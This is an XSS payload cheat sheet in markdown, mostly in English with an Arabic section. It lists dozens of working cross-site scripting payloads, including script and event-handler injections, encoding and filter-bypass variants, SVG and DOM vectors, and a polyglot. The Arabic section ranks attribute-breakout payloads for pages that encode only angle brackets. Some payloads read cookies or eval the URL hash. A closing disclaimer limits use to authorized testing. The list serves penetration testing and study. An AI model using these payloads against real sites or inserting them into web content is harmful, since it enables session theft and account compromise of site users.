## 🔰 Basic Payloads

### Standard Script Tags
```html
<script>alert(1)</script>
<script>prompt(1)</script>
<script>confirm(1)</script>
```

### Image with Error Handler
```html
<img src=x onerror=alert(1)>
<img src=x onerror=prompt(1)>
<image src/onerror=alert(1)>
```

## 🎯 Event Handlers

### Common Event Handlers
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<marquee onstart=alert(1)>
```

### Mouse Events
```html
<div onmouseover=alert(1)>Hover</div>
<img src=x onmouseover=alert(1)>
<body onmousemove=alert(1)>
```

### Form Events
```html
<input onfocus=alert(1) autofocus>
<textarea onkeyup=alert(1)>
<select onchange=alert(1)>
```

## 🔄 Encoding & Obfuscation

### HTML Entity Encoding
```html
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

### URL Encoding
```html
%3Cscript%3Ealert(1)%3C/script%3E
%253Cscript%253Ealert(1)%253C/script%253E
```

### JavaScript Encoding
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(/XSS/.source)>
```

## 🚀 Advanced Techniques

### Using JavaScript Protocol
```html
<iframe src=javascript:alert(1)>
<a href=javascript:alert(1)>Click</a>
<embed src=javascript:alert(1)>
```

### Data URI Scheme
```html
<object data="data:text/html,<script>alert(1)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

### CSS Expressions
```html
<div style="width:expression(alert(1))">
<style>body{background:url(javascript:alert(1))}</style>
```

## 🛡️ Bypass Techniques

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### White Space Manipulation
```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

### Null Byte Injection
```html
<scri%00pt>alert(1)</scri%00pt>
<img src=x%00 onerror=alert(1)>
```

### Comment Breaking
```html
<<script>alert(1)//<</script>
<!--><script>alert(1)</script>-->
```

## 📱 HTML5 Specific

### New HTML5 Events
```html
<video poster=javascript:alert(1)//
<audio src=1 onerror=alert(1)>
<details ontoggle=alert(1)>
```

### Form Actions
```html
<form><button formaction=javascript:alert(1)>X</form>
<input onsearch=alert(1)>
```

## 🔗 Link-Based XSS

### Various Link Formats
```html
<a href=javascript:alert(1)>Click</a>
<a href="jav&#x09;ascript:alert(1)">Click</a>
<a href="jav&#x0A;ascript:alert(1)">Click</a>
```

## 🎨 Style & CSS

### CSS Injection
```html
<div style=background:url(javascript:alert(1))>
<style>@import'javascript:alert(1)';</style>
<link rel=stylesheet href=javascript:alert(1)>
```

### Expression in CSS
```html
<div style="width:expression(alert(1))">
<div style="background:expression(alert(1))">
```

## 📊 SVG Vectors

### SVG-Based XSS
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script>
<svg><animate onbegin=alert(1)>
```

## 🔄 DOM-Based

### DOM XSS Examples
```html
<script>document.write('<img src=x onerror=alert(1)>')</script>
<script>eval(location.hash.slice(1))</script>
```

## 🌐 Protocol Handling

### Various Protocols
```html
<iframe src=javascript:alert(document.domain)>
<embed src=javascript:alert(1)>
<object data=javascript:alert(1)>
```

## ⚡ Quick Test Payloads

### Simple Test Cases
```html
'-alert(1)-'
"-alert(1)-"
';alert(1)//
";alert(1)//
```

### Minimal Payloads
```html
<svg/onload=alert(1)>
<iframe srcdoc="<img src=x onerror=alert(1)>">
```

## 🎭 Character Encoding

### Special Character Variations
```html
`"'><img src=xxx:x onerror=alert(1)>
'';!--"<XSS>=&{()}
```

### Unicode & Special Chars
```html
<script>\u0061lert(1)</script>
<script>alert&#40;1&#41;</script>
```

## 🔍 Detection Payloads

### Fingerprinting
```html
<script>alert(navigator.userAgent)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
```

## 🛠️ Polyglot Payloads

### Multi-context Payloads
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## في حالة **HTML-encoding  للـ < > فقط**:

1. **تقفل الـ attribute**
2. **تضيف event handler ينفّذ alert**
3. **تجبر العنصر ياخد focus أو يتحرّك عليه تلقائيًا**

إليك أقوى الباي لودات بالترتيب العملي:

---

### 1) الأكثر شيوعًا ونجاحًا

```
" autofocus onfocus=alert(1)
```

السبب:
`autofocus` يعطي الـ focus تلقائيًا، و `onfocus` يشغل الـ alert فورًا.

---

### 2) يعمل على معظم عناصر HTML

```
" onpointerover=alert(1)
```

أقوى من `onmouseover` لأنه event أحدث وبيشتغل على أغلب العناصر.

---

### 3) بديل قوي جدًا لو الصفحة فيها أي عنصر بـ hover

```
" onmouseover=alert(1)
```

---

### 4) Payload يعتمد على أخطاء الـ rendering

```
" onerror=alert(1)
```

لو العنصر يسمح بأخطاء مثل صور/inputs غير كاملة.

---

### 5) Payload فعال جدًا مع بعض القوالب

```
" onclick=alert(1)
```

لو الضحية هيضغط في جزء من الصفحة.

---

### 6) Payload مختصر وشرس

```
" onfocus=alert(1) autofocus
```

عكس الأول لكن نفس التأثير.

---

### 7) Payload قوي لو عندك attribute يُحوّل لداخل JS

```
" onload=alert(1)
```

بس ينفع فقط لو الـ input/element يسمح بحدث onload.

---

### 8) Payload bypass أكثر صمتًا

```
" accesskey=x onfocus=alert(1) autofocus
```

يجبر البراوزر يعمل focus بأمر اختصار لوحة المفاتيح.

---

ابدأ بهذا:

```
" autofocus onfocus=alert(1)
```

ولو ماشتغل:

```
" onpointerover=alert(1)
```



## 📝 Notes & Categories

### By Attack Vector
- **Reflected XSS**: Payloads reflected in response
- **Stored XSS**: Payloads stored on server
- **DOM XSS**: Client-side execution

### By Context
- **HTML Context**: Direct HTML injection
- **Attribute Context**: Inside HTML attributes
- **JavaScript Context**: Within script blocks
- **CSS Context**: Within style blocks

### Complexity Levels
- 🟢 **Basic**: Simple script tags and events
- 🟡 **Intermediate**: Encoding and basic obfuscation
- 🔴 **Advanced**: Complex bypasses and polyglots

---

## ⚠️ **Disclaimer**
Use these payloads only for:
- Security testing on systems you own
- Educational purposes
- Authorized penetration testing

Never use for malicious activities.

---

**ملاحظة:** هذا الملف يحتوي على تصنيف شامل لـ XSS payloads يمكن استخدامه كمرجع للاختبار والدراسة.